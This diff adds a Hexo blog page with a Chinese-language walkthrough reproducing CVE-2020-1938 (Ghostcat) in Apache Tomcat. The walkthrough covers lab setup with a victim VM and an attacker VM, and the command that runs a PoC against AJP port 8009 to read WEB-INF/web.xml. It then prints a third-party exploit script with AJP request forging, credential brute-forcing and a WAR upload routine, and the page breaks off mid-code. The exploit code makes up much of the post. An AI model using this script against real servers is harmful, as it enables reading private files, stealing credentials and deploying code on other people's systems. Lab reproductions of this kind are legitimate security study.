@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Poc of CVE-2020-1938" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/07/Poc%20of%20CVE-2020-1938/" class="article-date">
+  <time datetime="2020-03-07T05:23:58.799Z" itemprop="datePublished">2020-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/07/Poc%20of%20CVE-2020-1938/">CVE-2020-1938</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-1938任意文件读取漏洞复现及浅析"><a href="#CVE-2020-1938任意文件读取漏洞复现及浅析" class="headerlink" title="CVE-2020-1938任意文件读取漏洞复现及浅析"></a>CVE-2020-1938任意文件读取漏洞复现及浅析</h1><h2 id="Apache-Tomcat"><a href="#Apache-Tomcat" class="headerlink" title="Apache Tomcat"></a>Apache Tomcat</h2><p>Apache 和 Tomcat 都是Apache开源的提供HTTP服务的项目。Tomcat作为轻量级的web服务器得到了广泛的使用，根据ZoomEye统计，全世界大约有4,607,991部署了Tomcat；其中使用的国家统计如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-4530a47dc2855b22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>而该漏洞可以读取Tomcat目录中webapp下的任意文件，如下图所示，为我在靶机上搭建Tomcat的目录结构</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-fabac41a36c6ea00.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"></p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache Tomcat 6</p>
+<p>Apache Tomcat 7&lt;7.0.100</p>
+<p>Apache Tomcat 8&lt;8.5.51</p>
+<p>Apache Tomcat 9&lt;9.0.31</p>
+<p>常见的信息收集工具有很多，比如Kail Linux集成的很多工具，Google hacking等等……此外还有功能异常强大的Shodan和ZoomEye</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>首先我建立了两台虚拟机，一台部署Apache服务器作为靶机，一台作为攻击者，确保在同一个网段下：</p>
+<h3 id="靶机部署过程如下："><a href="#靶机部署过程如下：" class="headerlink" title="靶机部署过程如下："></a>靶机部署过程如下：</h3><p>下载Tomcat</p>
+<p><code>http://archive.apache.org/dist/tomcat</code> </p>
+<p>由于Tomcat依赖Java环境，如果没有Java环境，还需要安装Java</p>
+<p><code>https://www.oracle.com/java/technologies/javase-downloads.html</code></p>
+<p>选择Oracle JDK安装就可以，由于同样需要JRE，所以三个都勾选了，然后一路下一步</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-003542c2ed2d7b08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>比较麻烦的主要是环境变量的配置：</p>
+<p>我的电脑，右键，属性，高级，环境变量，首先在用户变量下新建变量<code>JAVA_HOME</code></p>
+<p>变量值为<code>C:\\你的目录\Java\jdk-版本号</code></p>
+<p>然后在系统变量Path下添加：<code>%JAVA_HOME%\bin;</code>bin是tomcat存放.sh/.bat文件的目录，是部署Tomcat的目录，然后把jre<code>%JAVA_HOME%\jre\bin</code>同样添加进去</p>
+<p>最后打开cmd，输入<code>java -version</code>如果没有报错，那就说明java环境配置无误</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-81546ffca63f0f9b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"></p>
+<p>之后打开Tomcat/bin目录，并且在此处打开cmd，输入<code>startup</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-0f9b97f7bc38b018.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"></p>
+<p>会自动弹出一个java窗口。再在浏览器输入<code>localhost:8080</code>如果出现如下页面说明tomcat成功部署</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-9db10da6fbdeadae.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"></p>
+<h2 id="攻击机部署步骤如下"><a href="#攻击机部署步骤如下" class="headerlink" title="攻击机部署步骤如下"></a>攻击机部署步骤如下</h2><p>本菜鸟用的是github上<code>https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</code></p>
+<p>的poc代码，一般大家环境变量肯定都设好了，我不再赘述，用的是Python2,下载下来后先进入目录，cmd输入<code>pip2 install -r requirements.txt</code>直接安装好相关依赖包</p>
+<p>然后用cmd执行poc代码:<code>python2 poc.py -p 8009 -f &quot;WEB_INF/web.xml&quot;</code>172.16.56.132</p>
+<p>也就是输入端口，因为使用ajp漏洞所以端口肯定是8009，第二个是文件目录，都是webapp下的，我是以WEB_INF/web.xml举例，最后一个就是我的靶机ip，下面是完整的poc代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Julien Legras - Synacktiv</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY</span></span><br><span class="line"><span class="comment"># EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment"># WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment"># DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY</span></span><br><span class="line"><span class="comment"># DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment"># (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;</span></span><br><span class="line"><span class="comment"># LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND</span></span><br><span class="line"><span class="comment"># ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT</span></span><br><span class="line"><span class="comment"># (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</span></span><br><span class="line"><span class="comment"># SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint, pformat</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> colorlog <span class="keyword">import</span> ColoredFormatter</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_logger</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return a logger with a default ColoredFormatter."""</span></span><br><span class="line">    formatter = ColoredFormatter(</span><br><span class="line">        <span class="string">"[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s"</span>,</span><br><span class="line">        datefmt=<span class="string">"%Y-%m-%d %H:%M:%S"</span>,</span><br><span class="line">        reset=<span class="literal">True</span>,</span><br><span class="line">        log_colors=&#123;</span><br><span class="line">            <span class="string">'DEBUG'</span>: <span class="string">'bold_purple'</span>,</span><br><span class="line">            <span class="string">'INFO'</span>: <span class="string">'bold_green'</span>,</span><br><span class="line">            <span class="string">'WARNING'</span>: <span class="string">'bold_yellow'</span>,</span><br><span class="line">            <span class="string">'ERROR'</span>: <span class="string">'bold_red'</span>,</span><br><span class="line">            <span class="string">'CRITICAL'</span>: <span class="string">'bold_red'</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    logger = logging.getLogger(<span class="string">'meow'</span>)</span><br><span class="line">    handler = logging.StreamHandler()</span><br><span class="line">    handler.setFormatter(formatter)</span><br><span class="line">    logger.addHandler(handler)</span><br><span class="line">    logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = setup_logger()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helpers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_ajp_forward_request</span><span class="params">(target_host, req_uri, method=AjpForwardRequest.GET)</span>:</span></span><br><span class="line">    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    fr.method = method</span><br><span class="line">    fr.protocol = <span class="string">"HTTP/1.1"</span></span><br><span class="line">    fr.req_uri = req_uri</span><br><span class="line">    fr.remote_addr = target_host</span><br><span class="line">    fr.remote_host = <span class="literal">None</span></span><br><span class="line">    fr.server_name = target_host</span><br><span class="line">    fr.server_port = <span class="number">80</span></span><br><span class="line">    fr.request_headers = &#123;</span><br><span class="line">        <span class="string">'SC_REQ_ACCEPT'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'SC_REQ_CONNECTION'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'SC_REQ_CONTENT_LENGTH'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'SC_REQ_HOST'</span>: target_host,</span><br><span class="line">        <span class="string">'SC_REQ_USER_AGENT'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.5'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span></span><br><span class="line">    &#125;</span><br><span class="line">    fr.is_ssl = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    fr.attributes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target_host, target_port)</span>:</span></span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.socket.connect((target_host, target_port))</span><br><span class="line">        self.stream = self.socket.makefile(<span class="string">"rb"</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_password</span><span class="params">(self, user, password)</span>:</span></span><br><span class="line">        res = <span class="literal">False</span></span><br><span class="line">        stop = <span class="literal">False</span></span><br><span class="line">        self.forward_request.request_headers[<span class="string">'SC_REQ_AUTHORIZATION'</span>] = <span class="string">"Basic "</span> + (<span class="string">"%s:%s"</span> % (user, password)).encode(</span><br><span class="line">            <span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> stop:</span><br><span class="line">            logger.debug(<span class="string">"testing %s:%s"</span> % (user, password))</span><br><span class="line">            responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">            snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> snd_hdrs_res.http_status_code == <span class="number">404</span>:</span><br><span class="line">                <span class="keyword">raise</span> NotFoundException(<span class="string">"The req_uri %s does not exist!"</span> % self.req_uri)</span><br><span class="line">            <span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">302</span>:</span><br><span class="line">                self.req_uri = snd_hdrs_res.response_headers.get(<span class="string">'Location'</span>, <span class="string">''</span>)</span><br><span class="line">                logger.info(<span class="string">"Redirecting to %s"</span> % self.req_uri)</span><br><span class="line">                self.forward_request.req_uri = self.req_uri</span><br><span class="line">            <span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">200</span>:</span><br><span class="line">                logger.info(<span class="string">"Found valid credz: %s:%s"</span> % (user, password))</span><br><span class="line">                res = <span class="literal">True</span></span><br><span class="line">                stop = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Set-Cookie'</span> <span class="keyword">in</span> snd_hdrs_res.response_headers:</span><br><span class="line">                    logger.info(<span class="string">"Here is your cookie: %s"</span> % (snd_hdrs_res.response_headers.get(<span class="string">'Set-Cookie'</span>, <span class="string">''</span>)))</span><br><span class="line">            <span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">403</span>:</span><br><span class="line">                logger.info(<span class="string">"Found valid credz: %s:%s but the user is not authorized to access this resource"</span> % (</span><br><span class="line">                    user, password))</span><br><span class="line">                stop = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">401</span>:</span><br><span class="line">                stop = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_bruteforce</span><span class="params">(self, users, passwords, req_uri, autostop)</span>:</span></span><br><span class="line">        logger.info(<span class="string">"Attacking a tomcat at ajp13://%s:%d%s"</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)</span><br><span class="line"></span><br><span class="line">        f_users = open(users, <span class="string">"r"</span>)</span><br><span class="line">        f_passwords = open(passwords, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">        valid_credz = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> f_users:</span><br><span class="line">                f_passwords.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">for</span> password <span class="keyword">in</span> f_passwords:</span><br><span class="line">                    <span class="keyword">if</span> autostop <span class="keyword">and</span> len(valid_credz) &gt; <span class="number">0</span>:</span><br><span class="line">                        self.socket.close()</span><br><span class="line">                        <span class="keyword">return</span> valid_credz</span><br><span class="line"></span><br><span class="line">                    user = user.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">                    password = password.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> self.test_password(user, password):</span><br><span class="line">                        valid_credz.append((user, password))</span><br><span class="line">        <span class="keyword">except</span> NotFoundException <span class="keyword">as</span> e:</span><br><span class="line">            logger.fatal(e.message)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            logger.debug(<span class="string">"Closing socket..."</span>)</span><br><span class="line">            self.socket.close()</span><br><span class="line">            <span class="keyword">return</span> valid_credz</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">perform_request</span><span class="params">(self, req_uri, headers=&#123;&#125;, method=<span class="string">'GET'</span>, user=None, password=None, attributes=[])</span>:</span></span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,</span><br><span class="line">                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">        logger.debug(<span class="string">"Getting resource at ajp13://%s:%d%s"</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.forward_request.request_headers[<span class="string">'SC_REQ_AUTHORIZATION'</span>] = <span class="string">"Basic "</span> + (<span class="string">"%s:%s"</span> % (user, password)).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">            self.forward_request.request_headers[h] = headers[h]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">            self.forward_request.attributes.append(a)</span><br><span class="line"></span><br><span class="line">        responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">        print(responses)</span><br><span class="line">        <span class="keyword">if</span> len(responses) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        data_res = responses[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> len(data_res) == <span class="number">0</span>:</span><br><span class="line">            logger.info(<span class="string">"No data in response. Headers:\n %s"</span> % pformat(vars(snd_hdrs_res)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self, filename, user, password, old_version, headers=&#123;&#125;)</span>:</span></span><br><span class="line">        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">"rb"</span>) <span class="keyword">as</span> f_input:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"w+b"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                s_form_header = <span class="string">'------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'</span> % os.path.basename(</span><br><span class="line">                    filename)</span><br><span class="line">                s_form_footer = <span class="string">'\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'</span></span><br><span class="line">                f.write(s_form_header)</span><br><span class="line">                f.write(f_input.read())</span><br><span class="line">                f.write(s_form_footer)</span><br><span class="line"></span><br><span class="line">        data_len = os.path.getsize(<span class="string">"/tmp/request"</span>)</span><br><span class="line"></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti"</span>,</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"%d"</span> % data_len,</span><br><span class="line">            <span class="string">"SC_REQ_REFERER"</span>: <span class="string">"http://%s/manager/html/"</span> % (self.target_host),</span><br><span class="line">            <span class="string">"Origin"</span>: <span class="string">"http://%s"</span> % (self.target_host),</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            headers[<span class="string">"SC_REQ_COOKIE"</span>] = obj_cookie.group(<span class="string">'cookie'</span>)</span><br><span class="line"></span><br><span class="line">        attributes = [&#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"JK_LB_ACTIVATION"</span>, <span class="string">"ACT"</span>)&#125;,</span><br><span class="line">                      &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"AJP_REMOTE_PORT"</span>, <span 